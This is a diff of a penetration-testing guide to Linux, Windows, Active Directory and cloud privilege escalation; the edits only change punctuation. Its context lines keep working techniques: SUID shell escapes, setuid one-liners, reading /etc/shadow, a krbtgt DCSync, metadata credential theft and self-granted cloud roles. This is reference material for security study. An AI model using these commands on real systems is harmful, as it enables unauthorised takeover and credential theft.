@@ -132,7 +132,7 @@ ls -la /usr/bin/find
 | `less` | `less /etc/passwd` then `!sh` |
 | `more` | `more /etc/passwd` then `!sh` |
 
-> Reference: [GTFOBins](https://gtfobins.github.io) — filter by "SUID" for the full binary list.
+> Reference: [GTFOBins](https://gtfobins.github.io); filter by "SUID" for the full binary list.
 
 ---
 
@@ -210,7 +210,7 @@ watch -n 1 "ps aux | grep cron"
 ./pspy64
 ```
 
-Exploitation — overwrite a world-writable cron script:
+Exploitation (overwrite a world-writable cron script):
 
 ```bash
 # Confirm the script is writable
@@ -271,7 +271,7 @@ getcap -r / 2>/dev/null
 # cap_net_raw    — raw socket access
 ```
 
-Exploitation — `cap_setuid+ep` on Python/Perl/Ruby:
+Exploitation (`cap_setuid+ep` on Python/Perl/Ruby):
 
 ```bash
 # Python3 with cap_setuid+ep
@@ -284,7 +284,7 @@ perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash"'
 ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
 ```
 
-Exploitation — `cap_dac_read_search` on tar:
+Exploitation (`cap_dac_read_search` on tar):
 
 ```bash
 # Read /etc/shadow with tar
@@ -319,7 +319,7 @@ su hax3r
 
 ### LD_PRELOAD Abuse
 
-When `sudo` is configured with `env_keep+=LD_PRELOAD`, a shared library injected via `LD_PRELOAD` will execute before the target binary — as root.
+When `sudo` is configured with `env_keep+=LD_PRELOAD`, a shared library injected via `LD_PRELOAD` will execute before the target binary, as root.
 
 ```bash
 # Confirm env_keep includes LD_PRELOAD in sudo -l output:
@@ -749,7 +749,7 @@ icacls "C:\Program Files\VulnApp\task.exe"
 accesschk.exe -qwvu "Everyone" "C:\Program Files\VulnApp\task.exe" /accepteula
 ```
 
-Exploitation — replace a writable task binary:
+Exploitation (replace a writable task binary):
 
 ```cmd
 :: Confirm writable
@@ -885,7 +885,7 @@ lsadump::dcsync /domain:DOMAIN /user:krbtgt
 
 ## 4. Cloud Privilege Escalation
 
-Cloud privilege escalation differs from traditional OS privesc — instead of exploiting binaries or kernel flaws, attackers abuse over-permissioned IAM identities, misconfigured role trust relationships, service account keys, and metadata service access. The goal is the same: move from lower-privilege access to one that allows full control, credential exfiltration, or lateral movement.
+Cloud privilege escalation differs from traditional OS privesc: instead of exploiting binaries or kernel flaws, attackers abuse over-permissioned IAM identities, misconfigured role trust relationships, service account keys, and metadata service access. The goal is the same: move from lower-privilege access to one that allows full control, credential exfiltration, or lateral movement.
 
 ---
 
@@ -969,7 +969,7 @@ aws lambda invoke --function-name privesc-func output.txt
 cat output.txt
 ```
 
-EC2 instance metadata — retrieve IAM role credentials:
+EC2 instance metadata (retrieve IAM role credentials):
 
 ```bash
 # From inside an EC2 instance — IMDSv1 (no token required)
@@ -998,7 +998,7 @@ python3 pacu.py
 # Inside Pacu: run module iam__privesc_scan
 ```
 
-> Reference: [Rhino Security Labs — AWS IAM Privilege Escalation Methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
+> Reference: [Rhino Security Labs, AWS IAM Privilege Escalation Methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
 
 ---
 
@@ -1024,7 +1024,7 @@ az ad group list --output table
 az ad group member list --group GROUP_ID
 ```
 
-Azure RBAC escalation — Owner or User Access Administrator:
+Azure RBAC escalation (Owner or User Access Administrator):
 
 If you have `Owner`, `User Access Administrator`, or `Microsoft.Authorization/roleAssignments/write` permission, you can grant yourself additional roles.
 
@@ -1042,7 +1042,7 @@ az role assignment create \
   --scope "/subscriptions/SUB_ID/resourceGroups/RG_NAME"
 ```
 
-Azure Managed Identity abuse — from a VM:
+Azure Managed Identity abuse (from a VM):
 
 ```bash
 # From inside an Azure VM — query IMDS for access token
@@ -1144,7 +1144,7 @@ gcloud projects add-iam-policy-binding PROJECT_ID \
   --role "roles/owner"
 ```
 
-GCE metadata server — retrieve service account token:
+GCE metadata server (retrieve service account token):
 
 ```bash
 # From inside a GCE instance
@@ -1171,7 +1171,7 @@ Workload identity impersonation:
 gcloud auth print-access-token --impersonate-service-account PRIVILEGED_SA@PROJECT_ID.iam.gserviceaccount.com
 ```
 
-> Reference: [GCP IAM Privilege Escalation — Dylan Ayrey (GitLab Security)](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/), [GCP IAM Escalation Techniques — Rhino Security Labs](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)
+> Reference: [GCP IAM Privilege Escalation, Dylan Ayrey (GitLab Security)](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/), [GCP IAM Escalation Techniques, Rhino Security Labs](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)
 
 ---
 
